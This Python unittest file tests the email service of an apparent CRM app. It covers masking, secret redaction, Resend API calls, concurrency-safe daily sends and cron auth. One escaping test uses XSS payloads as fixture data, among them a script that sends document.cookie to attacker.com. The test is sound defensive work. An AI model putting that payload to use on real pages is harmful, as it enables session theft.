import os
import sys
import unittest
from datetime import datetime, date, timedelta
from unittest.mock import patch, MagicMock

# Ensure backend directory is in sys.path
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.exc import IntegrityError
from sqlalchemy.pool import StaticPool
from fastapi.testclient import TestClient
import httpx

import models
from database import Base, get_db
import email_service
from main import app

class TestEmailService(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.engine = create_engine(
            "sqlite:///:memory:",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool
        )
        cls.TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=cls.engine)

    def setUp(self):
        Base.metadata.create_all(bind=self.engine)
        self.db = self.TestingSessionLocal()

        def override_get_db():
            db = self.TestingSessionLocal()
            try:
                yield db
            finally:
                db.close()

        app.dependency_overrides[get_db] = override_get_db
        self.client = TestClient(app)

    def tearDown(self):
        self.db.close()
        Base.metadata.drop_all(bind=self.engine)
        app.dependency_overrides.clear()

    # -------------------------------------------------------------------------
    # 1. Masking & Recipient Privacy Tests
    # -------------------------------------------------------------------------
    def test_mask_email(self):
        self.assertEqual(email_service.mask_email("admin@leadflow.demo"), "a***n@leadflow.demo")
        self.assertEqual(email_service.mask_email("user.name@example.org"), "u***e@example.org")
        self.assertEqual(email_service.mask_email("a@b.com"), "a***@b.com")
        self.assertEqual(email_service.mask_email(""), "")
        self.assertEqual(email_service.mask_email(None), "")

    def test_recipient_privacy_no_raw_recipient(self):
        """
        Verify that get_safe_email_status() completely omits raw_recipient
        and never leaks the full recipient email address or RESEND_API_KEY.
        """
        raw_admin_email = "administrator.confidential@enterprise-domain.com"
        with patch.dict(os.environ, {
            "RESEND_API_KEY": "re_live_secret_key_123456789",
            "EMAIL_FROM": "LeadFlow <onboarding@resend.dev>",
            "CRON_SECRET": "secret-cron-token-456",
            "FOLLOWUP_EMAIL_TO": raw_admin_email,
            "DAILY_FOLLOWUP_EMAIL_ENABLED": "true"
        }):
            status_data = email_service.get_safe_email_status()

            # 1. raw_recipient key must NOT exist
            self.assertNotIn("raw_recipient", status_data)

            # 2. Masked recipient must be present
            self.assertEqual(status_data["recipient_masked"], "a***l@enterprise-domain.com")
            self.assertEqual(status_data["recipient"], "a***l@enterprise-domain.com")

            # 3. Provider must be Resend HTTPS API
            self.assertEqual(status_data["provider"], "Resend HTTPS API")

            # 4. Raw email, API key, and cron secret must NEVER appear anywhere in serialized status
            dumped = str(status_data)
            self.assertNotIn(raw_admin_email, dumped)
            self.assertNotIn("re_live_secret_key_123456789", dumped)
            self.assertNotIn("secret-cron-token-456", dumped)

    # -------------------------------------------------------------------------
    # 2. HTML Injection Protection Tests
    # -------------------------------------------------------------------------
    def test_html_escaping_and_injection_prevention(self):
        """
        Verify that user-controlled lead data is properly escaped with html.escape
        and cannot inject arbitrary HTML tags, attributes, or JavaScript.
        """
        malicious_lead = models.Lead(
            company_name='<script>alert("XSS Company")</script> & "Co"',
            contact_person='<b>Attacker</b> <img src=x onerror=alert(1)>',
            email='malicious" onmouseover="alert(2)" style="color:red"@attacker.com',
            phone='<iframe src="evil.com"></iframe> +1-555-0199',
            city='San <script> Francisco',
            status='<style>body{display:none}</style>Meeting',
            follow_up_date='2026-11-23" onfocus="alert(3)',
            deal_value=50000.0,
            notes='"><script>fetch("http://attacker.com/steal?data="+document.cookie)</script>'
        )

        display_date = "Monday, November 23, 2026"
        html_body, text_body = email_service.render_followup_email(
            display_date,
            due_today_leads=[malicious_lead],
            overdue_leads=[]
        )

        # 1. Verify dangerous raw HTML constructs are NOT present
        self.assertNotIn('<script>', html_body)
        self.assertNotIn('</script>', html_body)
        self.assertNotIn('<img src=x', html_body)
        self.assertNotIn('<iframe', html_body)
        self.assertNotIn('<style>body{display:none}</style>', html_body)

        # 2. Verify escaped representations ARE present
        self.assertIn('&lt;script&gt;alert(&quot;XSS Company&quot;)&lt;/script&gt;', html_body)
        self.assertIn('&lt;b&gt;Attacker&lt;/b&gt;', html_body)
        self.assertIn('&lt;img src=x onerror=alert(1)&gt;', html_body)
        self.assertIn('&quot;&gt;&lt;script&gt;fetch', html_body)

        # 3. Verify attribute escaping on mailto href
        self.assertNotIn('href="mailto:malicious" onmouseover=', html_body)
        self.assertIn('href="mailto:malicious&quot; onmouseover=&quot;alert(2)&quot;', html_body)

        # 4. Verify plain text remains readable without HTML entities
        self.assertIn('Attacker', text_body)
        self.assertIn('XSS Company', text_body)
        self.assertNotIn('&lt;', text_body)

    def test_render_followup_email_empty(self):
        display_date = "Monday, November 23, 2026"
        html_body, text_body = email_service.render_followup_email(
            display_date,
            [],
            []
        )

        self.assertIn("No follow-ups scheduled for today.", html_body)
        self.assertIn("No follow-ups scheduled for today.", text_body)
        self.assertNotIn("OVERDUE FOLLOW-UPS", text_body)

    # -------------------------------------------------------------------------
    # 3. Resend HTTPS API Delivery Tests
    # -------------------------------------------------------------------------
    @patch("httpx.Client.post")
    def test_resend_api_send_success(self, mock_post):
        """
        Verify send_email dispatches HTTPS POST to https://api.resend.com/emails
        with Bearer authorization, JSON payload, and handles 200 response.
        """
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"id": "re_msg_abc123"}
        mock_post.return_value = mock_response

        with patch.dict(os.environ, {
            "RESEND_API_KEY": "re_test_key_xyz",
            "EMAIL_FROM": "LeadFlow CRM <onboarding@resend.dev>",
            "FOLLOWUP_EMAIL_TO": "admin@example.com"
        }):
            res = email_service.send_email(
                subject="Test Subject",
                html_body="<p>HTML</p>",
                text_body="Text",
                to_email="admin@example.com"
            )

            self.assertTrue(res["success"])
            self.assertEqual(res["id"], "re_msg_abc123")
            self.assertEqual(res["recipient"], "admin@example.com")

            # Verify POST called with correct endpoint and headers
            mock_post.assert_called_once()
            call_args, call_kwargs = mock_post.call_args
            self.assertEqual(call_args[0], "https://api.resend.com/emails")
            self.assertEqual(call_kwargs["headers"]["Authorization"], "Bearer re_test_key_xyz")
            self.assertEqual(call_kwargs["headers"]["Content-Type"], "application/json")
            self.assertEqual(call_kwargs["json"]["from"], "LeadFlow CRM <onboarding@resend.dev>")
            self.assertEqual(call_kwargs["json"]["to"], ["admin@example.com"])
            self.assertEqual(call_kwargs["json"]["subject"], "Test Subject")

    @patch("httpx.Client.post")
    def test_resend_api_error_handling_and_secret_redaction(self, mock_post):
        """
        Verify that Resend API error responses (e.g. 422 unverified domain, 401 invalid key)
        are cleanly handled, descriptive error message returned, and API key never leaked.
        """
        mock_response = MagicMock()
        mock_response.status_code = 422
        mock_response.json.return_value = {
            "statusCode": 422,
            "message": "You can only send testing emails to your own email address (user@example.com).",
            "name": "validation_error"
        }
        mock_post.return_value = mock_response

        secret_api_key = "re_confidential_api_token_999"
        with patch.dict(os.environ, {
            "RESEND_API_KEY": secret_api_key,
            "EMAIL_FROM": "LeadFlow CRM <onboarding@resend.dev>",
            "FOLLOWUP_EMAIL_TO": "unverified@external.com"
        }):
            res = email_service.send_email("Subject", "<p>HTML</p>", "Text", "unverified@external.com")
            self.assertFalse(res["success"])
            self.assertIn("only send testing emails to your own email address", res["error"])
            self.assertNotIn(secret_api_key, res["error"])

    @patch("httpx.Client.post")
    def test_resend_api_timeout(self, mock_post):
        """
        Verify timeout exception produces clean error without crash.
        """
        mock_post.side_effect = httpx.TimeoutException("Connection timed out after 15s")

        with patch.dict(os.environ, {
            "RESEND_API_KEY": "re_key_123",
            "FOLLOWUP_EMAIL_TO": "admin@example.com"
        }):
            res = email_service.send_email("Subject", "<p>HTML</p>", "Text", "admin@example.com")
            self.assertFalse(res["success"])
            self.assertIn("timed out", res["error"])

    def test_sanitize_error_string(self):
        secret_key = "re_test_ultra_secret_api_key_888"
        secret_cron = "my-ultra-secret-cron-token"
        with patch.dict(os.environ, {
            "RESEND_API_KEY": secret_key,
            "CRON_SECRET": secret_cron
        }):
            raw_err = f"Failed request with API key {secret_key} and cron {secret_cron}"
            sanitized = email_service.sanitize_error_string(raw_err)
            self.assertNotIn(secret_key, sanitized)
            self.assertNotIn(secret_cron, sanitized)
            self.assertIn("[REDACTED]", sanitized)

    # -------------------------------------------------------------------------
    # 4. Duplicate Delivery & Concurrency Protection Tests
    # -------------------------------------------------------------------------
    @patch("email_service.send_email")
    def test_send_daily_followup_email_success(self, mock_send):
        mock_send.return_value = {"success": True, "id": "re_msg_1", "error": None}
        today_str = email_service.get_current_date_strings()[0]

        lead = models.Lead(
            company_name="Zenith Systems",
            contact_person="Zoe Chen",
            email="zoe@zenith.com",
            phone="555-1234",
            city="Bangalore",
            status="New",
            follow_up_date=today_str,
            deal_value=30000.0,
            notes="Inbound request"
        )
        self.db.add(lead)
        self.db.commit()

        with patch.dict(os.environ, {
            "RESEND_API_KEY": "re_test_key",
            "FOLLOWUP_EMAIL_TO": "admin@example.com",
            "DAILY_FOLLOWUP_EMAIL_ENABLED": "true"
        }):
            result = email_service.send_daily_followup_email(self.db)
            self.assertEqual(result["status"], "success")
            self.assertEqual(result["delivery_date"], today_str)
            self.assertEqual(result["due_today_count"], 1)
            self.assertTrue(mock_send.called)

            # Verify persistent log in daily_email_logs
            log = self.db.query(models.DailyEmailLog).filter_by(delivery_date=today_str).first()
            self.assertIsNotNone(log)
            self.assertEqual(log.status, "SUCCESS")
            self.assertEqual(log.recipient, "admin@example.com")
            self.assertEqual(log.due_today_count, 1)

    @patch("email_service.send_email")
    def test_send_daily_followup_duplicate_prevention_already_sent(self, mock_send):
        mock_send.return_value = {"success": True, "error": None}
        today_str = email_service.get_current_date_strings()[0]

        # Insert an existing SUCCESS log for today
        existing_log = models.DailyEmailLog(
            delivery_date=today_str,
            recipient="admin@example.com",
            status="SUCCESS",
            due_today_count=2,
            overdue_count=1,
            sent_at=datetime.utcnow()
        )
        self.db.add(existing_log)
        self.db.commit()

        with patch.dict(os.environ, {
            "RESEND_API_KEY": "re_test_key",
            "FOLLOWUP_EMAIL_TO": "admin@example.com",
            "DAILY_FOLLOWUP_EMAIL_ENABLED": "true"
        }):
            result = email_service.send_daily_followup_email(self.db)
            self.assertEqual(result["status"], "already_sent")
            self.assertFalse(mock_send.called)

    @patch("email_service.send_email")
    def test_concurrent_claim_on_existing_failed_record(self, mock_send):
        """
        Two simultaneous requests on an existing FAILED record cannot both claim it.
        Only one succeeds in the atomic UPDATE, the other receives in_progress or already_sent.
        Exactly 1 email is sent.
        """
        import time
        from concurrent.futures import ThreadPoolExecutor

        def slow_send(*args, **kwargs):
            time.sleep(0.04)
            return {"success": True, "error": None}

        mock_send.side_effect = slow_send
        today_str = email_service.get_current_date_strings()[0]

        failed_log = models.DailyEmailLog(
            delivery_date=today_str,
            recipient="admin@example.com",
            status="FAILED",
            due_today_count=0,
            overdue_count=0,
            error_message="Previous failure"
        )
        self.db.add(failed_log)
        self.db.commit()

        session1 = self.TestingSessionLocal()
        session2 = self.TestingSessionLocal()

        def worker(sess):
            with patch.dict(os.environ, {
                "RESEND_API_KEY": "re_test_key",
                "FOLLOWUP_EMAIL_TO": "admin@example.com",
                "DAILY_FOLLOWUP_EMAIL_ENABLED": "true"
            }):
                return email_service.send_daily_followup_email(sess)

        with ThreadPoolExecutor(max_workers=2) as executor:
            f1 = executor.submit(worker, session1)
            f2 = executor.submit(worker, session2)
            r1 = f1.result()
            r2 = f2.result()

        session1.close()
        session2.close()

        statuses = [r1["status"], r2["status"]]
        self.assertIn("success", statuses)
        self.assertEqual(statuses.count("success"), 1)
        self.assertEqual(mock_send.call_count, 1)

        final_log = self.db.query(models.DailyEmailLog).filter_by(delivery_date=today_str).first()
        self.assertEqual(final_log.status, "SUCCESS")

    @patch("email_service.send_email")
    def test_concurrent_claim_on_stale_pending_record(self, mock_send):
        """
        Two simultaneous requests on a stale PENDING record (older than 5 minutes)
        cannot both claim it. Exactly 1 request wins the atomic UPDATE and sends.
        """
        import time
        from concurrent.futures import ThreadPoolExecutor

        def slow_send(*args, **kwargs):
            time.sleep(0.04)
            return {"success": True, "error": None}

        mock_send.side_effect = slow_send
        today_str = email_service.get_current_date_strings()[0]

        stale_log = models.DailyEmailLog(
            delivery_date=today_str,
            recipient="admin@example.com",
            status="PENDING",
            due_today_count=0,
            overdue_count=0,
            sent_at=datetime.utcnow() - timedelta(minutes=10)
        )
        self.db.add(stale_log)
        self.db.commit()

        session1 = self.TestingSessionLocal()
        session2 = self.TestingSessionLocal()

        def worker(sess):
            with patch.dict(os.environ, {
                "RESEND_API_KEY": "re_test_key",
                "FOLLOWUP_EMAIL_TO": "admin@example.com",
                "DAILY_FOLLOWUP_EMAIL_ENABLED": "true"
            }):
                return email_service.send_daily_followup_email(sess)

        with ThreadPoolExecutor(max_workers=2) as executor:
            f1 = executor.submit(worker, session1)
            f2 = executor.submit(worker, session2)
            r1 = f1.result()
            r2 = f2.result()

        session1.close()
        session2.close()

        statuses = [r1["status"], r2["status"]]
        self.assertIn("success", statuses)
        self.assertEqual(statuses.count("success"), 1)
        self.assertEqual(mock_send.call_count, 1)

        final_log = self.db.query(models.DailyEmailLog).filter_by(delivery_date=today_str).first()
        self.assertEqual(final_log.status, "SUCCESS")

    @patch("email_service.send_email")
    def test_concurrent_request_protection_pending_in_progress(self, mock_send):
        mock_send.return_value = {"success": True, "error": None}
        today_str = email_service.get_current_date_strings()[0]

        pending_log = models.DailyEmailLog(
            delivery_date=today_str,
            recipient="admin@example.com",
            status="PENDING",
            due_today_count=0,
            overdue_count=0,
            sent_at=datetime.utcnow() - timedelta(seconds=30)
        )
        self.db.add(pending_log)
        self.db.commit()

        with patch.dict(os.environ, {
            "RESEND_API_KEY": "re_test_key",
            "FOLLOWUP_EMAIL_TO": "admin@example.com",
            "DAILY_FOLLOWUP_EMAIL_ENABLED": "true"
        }):
            result = email_service.send_daily_followup_email(self.db)
            self.assertEqual(result["status"], "in_progress")
            self.assertFalse(mock_send.called)

    @patch("email_service.send_email")
    def test_send_daily_followup_retry_on_previous_failure(self, mock_send):
        mock_send.return_value = {"success": True, "error": None}
        today_str = email_service.get_current_date_strings()[0]

        failed_log = models.DailyEmailLog(
            delivery_date=today_str,
            recipient="admin@example.com",
            status="FAILED",
            due_today_count=0,
            overdue_count=0,
            error_message="Network connection reset"
        )
        self.db.add(failed_log)
        self.db.commit()

        with patch.dict(os.environ, {
            "RESEND_API_KEY": "re_test_key",
            "FOLLOWUP_EMAIL_TO": "admin@example.com",
            "DAILY_FOLLOWUP_EMAIL_ENABLED": "true"
        }):
            result = email_service.send_daily_followup_email(self.db)
            self.assertEqual(result["status"], "success")
            self.assertTrue(mock_send.called)

            log = self.db.query(models.DailyEmailLog).filter_by(delivery_date=today_str).first()
            self.assertEqual(log.status, "SUCCESS")

    @patch("email_service.send_email")
    def test_send_test_email(self, mock_send):
        mock_send.return_value = {"success": True, "id": "re_test_123", "error": None}

        with patch.dict(os.environ, {
            "RESEND_API_KEY": "re_test_key",
            "FOLLOWUP_EMAIL_TO": "admin@example.com"
        }):
            result = email_service.send_test_email()
            self.assertEqual(result["status"], "success")
            self.assertIn("Email configuration is working correctly", result["message"])
            self.assertEqual(self.db.query(models.DailyEmailLog).count(), 0)

    # -------------------------------------------------------------------------
    # 5. Cron Endpoint & Public Status API Tests
    # -------------------------------------------------------------------------
    def test_cron_endpoint_auth(self):
        secret = "test-cron-secret-token"
        with patch.dict(os.environ, {"CRON_SECRET": secret}):
            # Missing header -> 401
            res_missing = self.client.post("/api/cron/daily-followup")
            self.assertEqual(res_missing.status_code, 401)

            # Wrong token -> 401
            res_wrong = self.client.post(
                "/api/cron/daily-followup",
                headers={"Authorization": "Bearer wrong-token"}
            )
            self.assertEqual(res_wrong.status_code, 401)

            # Valid token -> 200
            with patch("email_service.send_daily_followup_email") as mock_cron:
                mock_cron.return_value = {"status": "success", "delivery_date": "2026-11-23"}
                res_ok = self.client.post(
                    "/api/cron/daily-followup",
                    headers={"Authorization": f"Bearer {secret}"}
                )
                self.assertEqual(res_ok.status_code, 200)
                self.assertEqual(res_ok.json()["status"], "success")

    def test_public_email_status_endpoint(self):
        raw_email = "admin@enterprise.com"
        secret_key = "re_live_secret_key_888"
        with patch.dict(os.environ, {
            "RESEND_API_KEY": secret_key,
            "EMAIL_FROM": "LeadFlow <onboarding@resend.dev>",
            "CRON_SECRET": "my-cron-key-12345",
            "FOLLOWUP_EMAIL_TO": raw_email,
            "DAILY_FOLLOWUP_EMAIL_ENABLED": "true"
        }):
            res = self.client.get("/api/email/status")
            self.assertEqual(res.status_code, 200)
            data = res.json()

            self.assertTrue(data["enabled"])
            self.assertTrue(data["configured"])
            self.assertEqual(data["recipient_masked"], "a***n@enterprise.com")
            self.assertEqual(data["scheduled_time"], "8:00 AM Asia/Kolkata")
            self.assertEqual(data["timezone"], "Asia/Kolkata")
            self.assertEqual(data["provider"], "Resend HTTPS API")

            # Must NEVER leak sensitive values or raw recipient
            payload_str = str(data)
            self.assertNotIn("raw_recipient", data)
            self.assertNotIn(raw_email, payload_str)
            self.assertNotIn(secret_key, payload_str)
            self.assertNotIn("my-cron-key-12345", payload_str)

    @patch("email_service.send_test_email")
    def test_send_test_email_endpoint(self, mock_test):
        mock_test.return_value = {
            "status": "success",
            "recipient": "admin@example.com",
            "message": "LeadFlow test email – Email configuration is working correctly."
        }
        res = self.client.post("/api/email/send-test")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.json()["status"], "success")
        self.assertIn("working correctly", res.json()["message"])

if __name__ == "__main__":
    unittest.main()
